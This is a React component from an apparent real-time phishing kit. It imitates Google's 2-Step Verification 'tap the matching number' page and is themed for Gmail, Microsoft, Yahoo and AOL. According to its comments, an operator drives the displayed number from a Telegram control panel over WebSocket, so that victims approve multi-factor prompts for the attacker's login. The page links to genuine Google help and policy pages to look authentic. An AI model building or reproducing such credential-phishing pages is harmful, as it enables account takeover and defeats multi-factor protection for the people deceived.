import React from 'react';
import { useLocation } from 'react-router-dom';
import { ProviderKey, getProviderTheme, ProviderLogo } from './providerTheme';

interface GoogleNumberPromptPageProps {
  providerKey: ProviderKey;
  /** Number forwarded by the operator over WebSocket. May also live on
   * `location.state.data.number` when the page is reached via navigation. */
  number?: number | string;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Google-style "Try signing in again" / 2-Step Verification "tap the matching
 * number" screen. The number itself is operator-driven (`show_google_number_prompt`
 * WebSocket command) — the page just displays it prominently, mirroring how
 * the real Google sign-in page asks the user to tap the matching number on
 * their phone.
 *
 * Although it is keyed off the Gmail flow, every provider routes here when the
 * operator clicks "Google # Prompt" in the Telegram control panel; we still
 * theme by provider so the chrome (background, fonts, accent) matches the
 * surrounding pages for that provider.
 */
const GoogleNumberPromptPage: React.FC<GoogleNumberPromptPageProps> = ({ providerKey, number: numberProp, onAction }) => {
  const location = useLocation();
  const theme = getProviderTheme(providerKey);
  const stateData = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (stateData.email as string) || '';
  const numberFromState = stateData.number as number | string | undefined;
  const number = (numberProp ?? numberFromState ?? '').toString();
  const deviceName = (stateData.deviceName as string) || (stateData.device as string) || 'your phone';

  const handleTryAnother = () => onAction('cancel');
  const handleNotMe = () => onAction('deny_authenticator');

  // Per-provider companion app name shown in the "Open your <app>" copy.
  // Defaults to the provider's display name (e.g. "Google", "Microsoft") when
  // no specific authenticator-app brand applies.
  const appName: Record<ProviderKey, string> = {
    gmail: 'Gmail',
    office365: 'Microsoft Authenticator',
    yahoo: 'Yahoo Mail',
    aol: 'AOL',
    others: 'authenticator',
  };

  // Gmail / Google has its own dedicated chrome (the real Google # prompt
  // screen). Other providers reuse the same big-number layout but in their
  // own theme so the experience is consistent if the operator ever fires
  // this command for a non-Gmail session.
  return (
    <div className={`min-h-screen flex flex-col font-sans ${theme.backgroundClass}`} style={{ fontFamily: theme.fontFamily }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div
          className={theme.cardClass + ' w-full max-w-[960px] mx-auto'}
          style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
        >
          <div className="flex flex-col md:flex-row md:gap-16">
            {/* Left column — branding, headline, account chip */}
            <div className="md:w-1/2 md:pt-4">
              <ProviderLogo providerKey={providerKey} className="h-10 w-10" />
              <h1 className="text-[28px] md:text-[36px] leading-tight font-normal text-gray-900 mt-8">
                2-Step Verification
              </h1>
              <p className="text-[15px] leading-6 text-gray-700 mt-4 max-w-md">
                To help keep your account safe, {theme.displayName} wants to make sure it&rsquo;s really you trying to sign in.
              </p>
              {email && (
                <div className="mt-6">
                  <button
                    type="button"
                    className="inline-flex items-center space-x-2 px-2 py-1 border border-gray-300 rounded-full hover:bg-gray-50 transition-colors"
                  >
                    <div
                      className="w-7 h-7 rounded-full flex items-center justify-center text-white text-xs font-semibold"
                      style={{ backgroundColor: theme.primary }}
                    >
                      {email.charAt(0).toUpperCase()}
                    </div>
                    <span className="text-sm text-gray-800 pr-1">{email}</span>
                  </button>
                </div>
              )}
            </div>

            {/* Right column — instructions + the prominent number */}
            <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col">
              <p className="text-[15px] leading-6 text-gray-800">
                Open your <strong>{appName[providerKey]}</strong> app on {deviceName}. Tap{' '}
                <strong>Yes</strong> on the prompt to verify it&rsquo;s you.
              </p>

              <div
                className="mt-8 flex flex-col items-center justify-center rounded-2xl py-10 px-6"
                style={{ backgroundColor: theme.primaryLight, border: `1px solid ${theme.primaryLight}` }}
              >
                <p className="text-sm text-gray-700 mb-3">Tap the number you see below</p>
                <div
                  className="font-semibold text-gray-900 select-none"
                  style={{ fontSize: '88px', lineHeight: '1', letterSpacing: '0.04em' }}
                  aria-label={`Verification number ${number}`}
                >
                  {number || '--'}
                </div>
                <div className="flex items-center justify-center mt-6">
                  <svg
                    className="animate-spin h-5 w-5 mr-2"
                    style={{ color: theme.primary }}
                    viewBox="0 0 24 24"
                    fill="none"
                    aria-hidden="true"
                  >
                    <circle cx="12" cy="12" r="10" stroke="currentColor" strokeOpacity=".25" strokeWidth="4" />
                    <path d="M4 12a8 8 0 018-8" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
                  </svg>
                  <span className="text-sm text-gray-700">Waiting for you to tap on your phone&hellip;</span>
                </div>
              </div>

              <div className="flex justify-between items-center mt-10">
                <button
                  type="button"
                  onClick={handleTryAnother}
                  className="text-sm font-semibold hover:underline"
                  style={{ color: theme.primary }}
                >
                  Try another way
                </button>
                <button
                  type="button"
                  onClick={handleNotMe}
                  className="px-5 py-2 border border-gray-300 text-gray-700 text-sm font-semibold rounded-full hover:bg-gray-50"
                >
                  It wasn&rsquo;t me
                </button>
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer className="w-full max-w-[960px] mx-auto flex justify-between items-center px-4 py-6 text-xs text-gray-700">
        <div />
        <div className="flex items-center space-x-4">
          <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
          <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
        </div>
      </footer>
    </div>
  );
};

export default GoogleNumberPromptPage;
